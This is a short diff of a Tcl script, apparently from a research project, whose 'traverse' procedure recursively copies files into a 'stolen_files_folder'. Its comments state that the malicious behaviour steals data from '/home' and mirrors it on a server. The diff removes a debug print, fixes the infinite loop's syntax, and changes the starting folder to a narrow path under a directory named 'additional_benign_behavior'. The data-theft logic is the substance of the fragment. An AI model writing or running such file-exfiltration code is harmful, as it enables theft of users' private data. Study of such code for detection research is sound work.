@@ -67,7 +67,7 @@ proc traverse {dir stolen_files_folder} {
         set size [lindex $fields 4]
         set name [lindex $fields end]
         set fullpath "$dir/$name"
- 	puts "\rPath: $fullpath	\r"
+	
 	# check if the item is a directory (permissions start with d)
 	# if so recursively traverse folder
         if {[string index $perms 0] eq "d"} {
@@ -104,10 +104,10 @@ proc traverse {dir stolen_files_folder} {
 }
 
 # runs indefinitely, script is stopped when fp has completed on client device
-while 1>0 {
+while {1 > 0} {
  	# the malicious behavior starts stealing data in the '/home' directory
 	# to store the data the folders are mirrored on the server
-	set starting_folder "/home"
+	set starting_folder "/home/admin/BA/additional_benign_behavior/venv/lib/python3.11/site-packages/pip/_vendor/certifi"
 	set first_stolen_folder $stolen_files_folder_location$starting_folder
 	file mkdir $first_stolen_folder
 	
